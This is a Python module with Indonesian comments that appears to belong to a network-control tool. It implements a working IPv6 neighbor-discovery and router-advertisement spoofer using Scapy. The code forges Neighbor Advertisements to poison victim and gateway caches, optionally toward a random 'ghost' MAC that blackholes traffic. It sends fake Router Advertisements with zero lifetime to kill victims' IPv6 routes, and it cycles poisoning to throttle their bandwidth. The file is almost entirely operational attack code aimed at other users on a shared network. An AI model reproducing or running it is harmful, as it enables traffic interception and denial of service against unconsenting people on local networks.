#!/usr/bin/env python3
"""
High-Performance Thread-Safe IPv6 NDP & RA Spoofer
==================================================
- Menggunakan sendp Layer 2 dengan Scapy dan paket ICMPv6 Neighbor Advertisement (NA)
  dan ICMPv6 Router Advertisement (RA) dengan routerlifetime=0 untuk invalidasi rute.
- Mengikuti seluruh Core Invariants (Gateway Immunity, Self-Protection, Lock Concurrency).
- Mendukung PWM Throttling dan Clean Teardown restoration burst.
"""

import sys
import time
import threading
import random
import uuid
from typing import Dict, Optional, Any, List, Tuple
from scapy.all import (
    sendp,
    Ether,
    IPv6,
    ICMPv6ND_NA,
    ICMPv6ND_RA,
    ICMPv6NDOptDstLLAddr,
    ICMPv6NDOptSrcLLAddr,
    conf,
    ifaces
)
from .network import get_network_info
from ..utils.logger import logger
from ..exceptions.custom import SpoofError, SessionNotFoundError

conf.verb = 0

class NDPSpoofer:
    """Orkestrator manipulasi Layer 2/3 IPv6 berbasis NDP & RA."""

    def __init__(self):
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._threads: Dict[str, threading.Thread] = {}
        self._stop_events: Dict[str, threading.Event] = {}
        self._lock = threading.Lock()
        self._interface = None
        self._win_interface_name = None
        self._self_mac = None

        self.refresh_interface()

    def refresh_interface(self):
        """Dapatkan interface Scapy yang valid dan MAC controller."""
        with self._lock:
            try:
                info = get_network_info()
                my_ip = info.get('ip')
                self._interface = None
                self._win_interface_name = None
                self._self_mac = None

                if my_ip:
                    for scapy_name, scapy_obj in ifaces.items():
                        if hasattr(scapy_obj, 'ips') and my_ip in scapy_obj.ips:
                            self._interface = scapy_obj
                            self._win_interface_name = getattr(scapy_obj, 'name', 'Wi-Fi')
                            self._self_mac = getattr(scapy_obj, 'mac', None)
                            break

                if not self._interface:
                    self._interface = conf.iface
                    self._win_interface_name = getattr(conf.iface, 'name', 'Wi-Fi')
                    self._self_mac = getattr(conf.iface, 'mac', '00:00:00:00:00:00')

                if self._self_mac:
                    self._self_mac = str(self._self_mac).lower().replace('-', ':')
                else:
                    self._self_mac = '00:00:00:00:00:00'

            except Exception as e:
                logger.warning(f"Gagal refresh interface IPv6 spoofer: {e}")
                self._interface = conf.iface
                self._win_interface_name = getattr(conf.iface, 'name', 'Wi-Fi')
                self._self_mac = '00:00:00:00:00:00'

    def _build_spoof_packets(
        self,
        victim_ipv6: str,
        victim_mac: str,
        gateway_ipv6: str,
        gateway_mac: str,
        self_mac: str,
        poison_mac: Optional[str] = None
    ) -> List[Any]:
        """
        Bangun paket Scapy ICMPv6 Neighbor Advertisement (NA) palsu.
        `poison_mac` = LLA yang DIKLAIM (default self_mac); mode blackhole (Gaming)
        memberi MAC hantu agar trafik IPv6 korban jatuh di AP, bukan ke operator.
        Ether.src tetap self_mac (frame fisik dari kita).
        """
        pkts = []
        clean_vic_ip = victim_ipv6.split('%')[0].strip()
        clean_gw_ip = gateway_ipv6.split('%')[0].strip()
        lla = poison_mac or self_mac

        # 1. NA ke Korban: Gateway IPv6 dipetakan ke LLA (self/hantu)
        na_victim = (
            Ether(dst=victim_mac, src=self_mac) /
            IPv6(src=clean_gw_ip, dst=clean_vic_ip) /
            ICMPv6ND_NA(tgt=clean_gw_ip, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=lla)
        )
        pkts.append(na_victim)

        # 2. NA ke Gateway: Korban IPv6 dipetakan ke LLA (self/hantu)
        na_gateway = (
            Ether(dst=gateway_mac, src=self_mac) /
            IPv6(src=clean_vic_ip, dst=clean_gw_ip) /
            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=lla)
        )
        pkts.append(na_gateway)

        # 3. Fake Router Advertisement dengan Router Lifetime = 0 (Rute internet IPv6 drop)
        ra_drop = (
            Ether(dst=victim_mac, src=self_mac) /
            IPv6(src=clean_gw_ip, dst="ff02::1") /
            ICMPv6ND_RA(routerlifetime=0)
        )
        pkts.append(ra_drop)

        return pkts

    def _build_restore_packets(
        self,
        victim_ipv6: str,
        victim_mac: str,
        gateway_ipv6: str,
        gateway_mac: str
    ) -> List[Any]:
        """
        Bangun paket restorasi resmi (True MAC) untuk memulihkan cache NDP.
        """
        pkts = []
        clean_vic_ip = victim_ipv6.split('%')[0].strip()
        clean_gw_ip = gateway_ipv6.split('%')[0].strip()

        # Pulihkan Gateway asli ke Korban
        restore_victim = (
            Ether(dst=victim_mac, src=gateway_mac) /
            IPv6(src=clean_gw_ip, dst=clean_vic_ip) /
            ICMPv6ND_NA(tgt=clean_gw_ip, R=1, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=gateway_mac)
        )
        pkts.append(restore_victim)

        # Pulihkan Korban asli ke Gateway
        restore_gateway = (
            Ether(dst=gateway_mac, src=victim_mac) /
            IPv6(src=clean_vic_ip, dst=clean_gw_ip) /
            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=victim_mac)
        )
        pkts.append(restore_gateway)

        return pkts

    def _spoof_loop(self, session_id: str, stop_event: threading.Event):
        """Thread loop manipulasi paket IPv6 dengan PWM duty-cycle."""
        with self._lock:
            session = self._sessions.get(session_id)
            if not session:
                return
            victim_ipv6 = session['victim_ipv6']
            victim_mac = session['victim_mac']
            gateway_ipv6 = session['gateway_ipv6']
            gateway_mac = session['gateway_mac']
            blackhole_mac = session.get('blackhole_mac')  # MAC hantu utk mode Gaming
            iface = self._interface

        self_mac = self._self_mac or '00:00:00:00:00:00'
        spoof_pkts = self._build_spoof_packets(victim_ipv6, victim_mac, gateway_ipv6, gateway_mac, self_mac, poison_mac=blackhole_mac)
        restore_pkts = self._build_restore_packets(victim_ipv6, victim_mac, gateway_ipv6, gateway_mac)

        logger.info(f"🚀 IPv6 NDP Spoofing loop berjalan: {victim_ipv6} <-> {gateway_ipv6}")

        # Periode siklus duty-cycle throttle (selaras dengan spoofer IPv4)
        cycle_period = 1.2

        while not stop_event.is_set():
            try:
                # Ambil speed_limit saat ini tanpa menahan lock saat I/O
                with self._lock:
                    s = self._sessions.get(session_id)
                    speed_limit = s.get('speed_limit', 0) if s else 0

                # Mode bebas (>= 100): tidak ada manipulasi IPv6
                if speed_limit >= 100:
                    if stop_event.wait(0.5):
                        break
                    continue

                if speed_limit <= 0:
                    # BLOK PENUH: racun NDP terus-menerus (rute IPv6 di-drop)
                    sendp(spoof_pkts, iface=iface, verbose=0)
                    with self._lock:
                        if session_id in self._sessions:
                            self._sessions[session_id]['packets_sent'] += len(spoof_pkts)
                    if stop_event.wait(1.2 + random.uniform(-0.1, 0.1)):
                        break
                    continue

                # DUTY-CYCLE THROTTLE (paritas IPv4): fase racun (drop) lalu fase restore (lancar).
                # speed_limit tinggi -> Rp kecil -> fase normal lebih lama -> bandwidth lebih besar.
                poison_ratio = max(0.15, min(0.85, (100 - speed_limit) / 100.0 * 0.85))
                t_poison = max(0.15, cycle_period * poison_ratio)
                t_normal = max(0.25, cycle_period * (1.0 - poison_ratio))

                # FASE RACUN: arahkan gateway IPv6 ke MAC controller + RA lifetime 0 -> rute drop
                sendp(spoof_pkts, iface=iface, verbose=0)
                with self._lock:
                    if session_id in self._sessions:
                        self._sessions[session_id]['packets_sent'] += len(spoof_pkts)
                if stop_event.wait(t_poison):
                    break

                # FASE NORMAL: pulihkan cache NDP ke gateway asli -> trafik IPv6 lancar
                sendp(restore_pkts, iface=iface, verbose=0)
                if stop_event.wait(t_normal):
                    break

            except Exception as e:
                logger.error(f"Error in IPv6 spoof loop {session_id}: {e}")
                if stop_event.wait(1.0):
                    break

        logger.info(f"⏹️ IPv6 Session {session_id} berhenti")

    def _generate_blackhole_mac(self, victim_mac: str = "", gateway_mac: str = "") -> str:
        """MAC hantu locally-administered unicast (paritas dgn spoofer IPv4)."""
        forbidden = {
            (self._self_mac or '').lower(),
            (victim_mac or '').lower().replace('-', ':'),
            (gateway_mac or '').lower().replace('-', ':'),
            'ff:ff:ff:ff:ff:ff',
        }
        for _ in range(10):
            first = (random.randint(0, 255) & 0xFE) | 0x02
            mac = ':'.join(f"{b:02x}" for b in [first] + [random.randint(0, 255) for _ in range(5)])
            if mac not in forbidden and not mac.startswith('33:33'):
                return mac
        return '02:00:00:de:ad:06'

    def start_spoof(
        self,
        victim_ipv6: str,
        victim_mac: str,
        gateway_ipv6: str,
        gateway_mac: str,
        speed_limit: int = 0,
        blackhole: bool = False
    ) -> str:
        """Mulai sesi manipulasi IPv6 untuk target tertentu."""
        # 1. Invariant: Validasi dasar
        if not victim_ipv6 or not victim_mac or not gateway_ipv6 or not gateway_mac:
            raise SpoofError("victim_ipv6, victim_mac, gateway_ipv6, dan gateway_mac wajib diisi")

        norm_vic_mac = victim_mac.lower().replace('-', ':')
        norm_gw_mac = gateway_mac.lower().replace('-', ':')
        self_mac = (self._self_mac or '').lower().replace('-', ':')

        # 2. Invariant: Gateway Immunity & Self Protection
        if norm_vic_mac == norm_gw_mac or victim_ipv6 == gateway_ipv6:
            raise SpoofError("Gateway IPv6 kebal dan tidak boleh dijadikan target manipulasi")
        if self_mac and norm_vic_mac == self_mac:
            raise SpoofError("Host controller sendiri kebal dari manipulasi IPv6")

        session_id = f"v6_{victim_ipv6.replace(':', '_')}_{uuid.uuid4().hex}"

        # Hentikan sesi lama secara bersih jika ada untuk MAC yang sama
        with self._lock:
            existing_sids = [
                old_id for old_id, s in self._sessions.items()
                if s.get('victim_mac') == norm_vic_mac and s.get('active')
            ]
        for old_id in existing_sids:
            try:
                self.stop_spoof(old_id)
            except Exception as e:
                logger.debug(f"Notice stopping prior IPv6 session {old_id}: {e}")

        with self._lock:
            stop_event = threading.Event()
            self._sessions[session_id] = {
                'session_id': session_id,
                'victim_ipv6': victim_ipv6,
                'victim_mac': norm_vic_mac,
                'gateway_ipv6': gateway_ipv6,
                'gateway_mac': norm_gw_mac,
                'speed_limit': max(0, min(100, speed_limit)),
                'blackhole_mac': self._generate_blackhole_mac(norm_vic_mac, norm_gw_mac) if blackhole else None,
                'started_at': time.time(),
                'packets_sent': 0,
                'active': True
            }
            self._stop_events[session_id] = stop_event

            thread = threading.Thread(
                target=self._spoof_loop,
                args=(session_id, stop_event),
                name=f"NDPSpoofer-{session_id}",
                daemon=True
            )
            self._threads[session_id] = thread
            thread.start()

        logger.info(f"✅ Sesi IPv6 {session_id} dimulai ({victim_ipv6})")
        return session_id

    def set_speed_limit(self, session_id: str, speed_limit: int) -> bool:
        """Ubah batas kecepatan sesi IPv6 secara dinamis."""
        with self._lock:
            if session_id not in self._sessions:
                return False
            clamped = max(0, min(100, speed_limit))
            self._sessions[session_id]['speed_limit'] = clamped
            logger.info(f"⚡ Speed limit IPv6 session {session_id} -> {clamped}%")
            return True

    def stop_spoof(self, session_id: str) -> None:
        """Hentikan sesi manipulasi IPv6 dan pulihkan rute/NDP cache target."""
        with self._lock:
            if session_id not in self._sessions:
                raise SessionNotFoundError(f"Sesi IPv6 {session_id} tidak ditemukan")
            session = self._sessions[session_id]
            stop_event = self._stop_events.get(session_id)
            if stop_event:
                stop_event.set()

            victim_ipv6 = session['victim_ipv6']
            victim_mac = session['victim_mac']
            gateway_ipv6 = session['gateway_ipv6']
            gateway_mac = session['gateway_mac']
            iface = self._interface

            # Hapus dari daftar sesi aktif
            self._sessions.pop(session_id, None)
            self._threads.pop(session_id, None)
            self._stop_events.pop(session_id, None)

        # Lakukan restorasi jaringan DI LUAR LOCK (5 burst packet)
        try:
            restore_pkts = self._build_restore_packets(victim_ipv6, victim_mac, gateway_ipv6, gateway_mac)
            for _ in range(5):
                sendp(restore_pkts, iface=iface, verbose=0)
                time.sleep(0.08)
            logger.info(f"✅ Sesi IPv6 {session_id} dihentikan & dipulihkan dengan mulus")
        except Exception as e:
            logger.error(f"Error restoring IPv6 NDP for {session_id}: {e}")

    def stop_all(self) -> None:
        """Hentikan seluruh sesi IPv6 aktif."""
        with self._lock:
            session_ids = list(self._sessions.keys())

        for sid in session_ids:
            try:
                self.stop_spoof(sid)
            except Exception as e:
                logger.warning(f"Error stopping IPv6 session {sid}: {e}")

    def get_status(self) -> Dict[str, Any]:
        """Ambil status seluruh sesi IPv6."""
        with self._lock:
            return {
                'active_sessions': len(self._sessions),
                'sessions': {k: dict(v) for k, v in self._sessions.items()}
            }

# Singleton instance
ndp_spoofer = NDPSpoofer()
